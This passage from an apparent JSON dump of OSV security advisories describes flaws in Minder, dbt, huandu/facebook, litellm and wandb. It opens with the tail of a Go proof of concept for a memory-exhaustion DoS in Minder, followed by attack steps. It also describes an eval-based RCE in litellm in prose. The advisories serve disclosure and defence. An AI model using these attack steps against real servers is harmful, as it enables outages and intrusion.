json.NewDecoder(maliciousBodyReader).Decode(&amp;attestationReply)\n}\n\n```\n\nThis example mimics the behavior of Minders `getAttestationReply` and how a malicious response body passed to `getAttestationReply\u2019s` parsing of the response will cause DoS.\n\nWhen running this script locally on my system, Go incrementally increases memory consumption up to above 90%, freezes the machine and then performs a sigkill.\n\n## Attack vector\nThe content that is hosted at the `orgs&#x2F;$owner&#x2F;attestations&#x2F;$checksumref` GitHub attestation endpoint is controlled by users including unauthenticated users to Minders threat model. However, a user will need to configure their own Minder settings to cause Minder to make Minder send a request to fetch the attestations. The user would need to know of a package whose attestations were configured in such a way that they would return a large response when fetching them. As such, the steps needed to carry out this attack would look as such:\n\n1. The attacker adds a package to ghcr.io with attestations that can be fetched via the `orgs&#x2F;$owner&#x2F;attestations&#x2F;$checksumref` GitHub endpoint.\n2. The attacker registers on Minder and makes Minder fetch the attestations.\n3. Minder fetches attestations and crashes thereby being denied of service.\n",
            "published": "2024-05-28T16:55:02Z",

            "details": "<b></b><br>dbt enables data analysts and engineers to transform their data using the same practices that software engineers use to build applications. Prior to versions 1.6.15, 1.7.15, and 1.8.1, Binding to `INADDR_ANY (0.0.0.0)` or `IN6ADDR_ANY (::)` exposes an application on all network interfaces, increasing the risk of unauthorized access. As stated in the Python docs, a special form for address is accepted instead of a host address: `&#x27;&#x27;` represents `INADDR_ANY`, equivalent to `&quot;0.0.0.0&quot;`. On systems with IPv6, &#x27;&#x27; represents `IN6ADDR_ANY`, which is equivalent to `&quot;::&quot;`. A user who serves docs on an unsecured public network, may unknowingly be hosting an unsecured (http) web site for any remote user&#x2F;system to access on the same network. The issue has has been mitigated in dbt-core v1.6.15, dbt-core v1.7.15, and dbt-core v1.8.1 by binding to localhost explicitly by default in `dbt docs serve`.\n",

            "id": "<a href='https://osv.dev/vulnerability/CVE-2024-35238' target='_blank'>CVE-2024-35238</a>",
            "details": "<b></b><br>Minder by Stacklok is an open source software supply chain security platform. Minder prior to version 0.0.51 is vulnerable to a denial-of-service (DoS) attack which could allow an attacker to crash the Minder server and deny other users access to it. The root cause of the vulnerability is that Minders sigstore verifier reads an untrusted response entirely into memory without enforcing a limit on the response body. An attacker can exploit this by making Minder make a request to an attacker-controlled endpoint which returns a response with a large body which will crash the Minder server. Specifically, the point of failure is where Minder parses the response from the GitHub attestations endpoint in `getAttestationReply`. Here, Minder makes a request to the `orgs&#x2F;$owner&#x2F;attestations&#x2F;$checksumref` GitHub endpoint (line 285) and then parses the response into the `AttestationReply` (line 295). The way Minder parses the response on line 295 makes it prone to DoS if the response is large enough. Essentially, the response needs to be larger than the machine has available memory.  Version 0.0.51 contains a patch for this issue.\n\nThe content that is hosted at the `orgs&#x2F;$owner&#x2F;attestations&#x2F;$checksumref` GitHub attestation endpoint is controlled by users including unauthenticated users to Minders threat model. However, a user will need to configure their own Minder settings to cause Minder to make Minder send a request to fetch the attestations. The user would need to know of a package whose attestations were configured in such a way that they would return a large response when fetching them. As such, the steps needed to carry out this attack would look as such:\n\n1. The attacker adds a package to ghcr.io with attestations that can be fetched via the `orgs&#x2F;$owner&#x2F;attestations&#x2F;$checksumref` GitHub endpoint.\n2. The attacker registers on Minder and makes Minder fetch the attestations.\n3. Minder fetches attestations and crashes thereby being denied of service.",

            "id": "<a href='https://osv.dev/vulnerability/GHSA-3f65-m234-9mxr' target='_blank'>GHSA-3f65-m234-9mxr</a>",
            "details": "<b>github.com&#x2F;huandu&#x2F;facebook may expose access_token in error message.</b><br>### Summary\naccess_token can be exposed in error message on fail in HTTP request.\n\n### Details\nUsing this module, when HTTP request fails, error message can contain access_token. This can be happen when:\n- module is sending HTTP request with query parameter `?access_token=...`.\n- and HTTP request fails (errors like `facebook: cannot reach facebook server`).\n\nIn such situation, error message is constucted like following.\nhttps:&#x2F;&#x2F;github.com&#x2F;huandu&#x2F;facebook&#x2F;blob&#x2F;1591be276561bbdb019c0279f1d33cb18a650e1b&#x2F;session.go#L558-L567\nOriginal error message contained in it comes from `net&#x2F;http` module. And it can contain full URL, that can contain query parameter `access_token`:\nhttps:&#x2F;&#x2F;cs.opensource.google&#x2F;go&#x2F;go&#x2F;+&#x2F;refs&#x2F;tags&#x2F;go1.22.3:src&#x2F;net&#x2F;http&#x2F;client.go;l=629-633\nhttps:&#x2F;&#x2F;cs.opensource.google&#x2F;go&#x2F;go&#x2F;+&#x2F;refs&#x2F;tags&#x2F;go1.22.3:src&#x2F;net&#x2F;url&#x2F;url.go;l=30\n\nIt should be very common that applications log error message when they encounter errors. As a result, access_token can be stored into log server and some other infrastructures. Of course other careless error handling in client code that causing other security problems can exist.\n\nI&#x27;m not very sure that whether we can consider that github.com&#x2F;huandu&#x2F;facebook is vulnerable. Anyway, I think current error message, that can expose access_token, is not desirble.\n\n### PoC\nRequest me this section if you need complete instruction.\n\n### Impact\nClient applications with following conditions can be affected.\n- logs error message from this module\n- or returns error message to client as something like HTTP response.\n- or uses error messages somewhere\n",

            "id": "<a href='https://osv.dev/vulnerability/GHSA-7ggm-4rjg-594w' target='_blank'>GHSA-7ggm-4rjg-594w</a>",
            "details": "<b>litellm passes untrusted data to `eval` function without sanitization</b><br>A remote code execution (RCE) vulnerability exists in the berriai&#x2F;litellm project due to improper control of the generation of code when using the `eval` function unsafely in the `litellm.get_secret()` method. Specifically, when the server utilizes Google KMS, untrusted data is passed to the `eval` function without any sanitization. Attackers can exploit this vulnerability by injecting malicious values into environment variables through the `&#x2F;config&#x2F;update` endpoint, which allows for the update of settings in `proxy_server_config.yaml`.",

        }, {
            "ecosystem": "PyPI",
            "id": "<a href='https://osv.dev/vulnerability/GHSA-cqh9-jfqr-h9jj' target='_blank'>GHSA-cqh9-jfqr-h9jj</a>",
            "details": "<b>Withdrawn Advisory: Weights and Biases (wandb) has a Server-Side Request Forgery (SSRF) vulnerability</b><br>## Withdrawn Advisory\nThis advisory has been withdrawn because the underlying issue existed in Weights and Biases&#x27;s backend server code, not the software development kit included in the `wandb` PyPI package, as originally reported. This link is maintained to preserve external references.\n\n## Original Description\nA Server-Side Request Forgery (SSRF) vulnerability exists in the wandb&#x2F;wandb repository due to improper handling of HTTP 302 redirects. This issue allows team members with access to the &#x27;User settings -&amp;gt; Webhooks&#x27; function to exploit this vulnerability to access internal HTTP(s) servers. In severe cases, such as on AWS instances, this could potentially be abused to achieve remote code execution on the victim&#x27;s machine. The vulnerability is present in the latest version of the repository.",
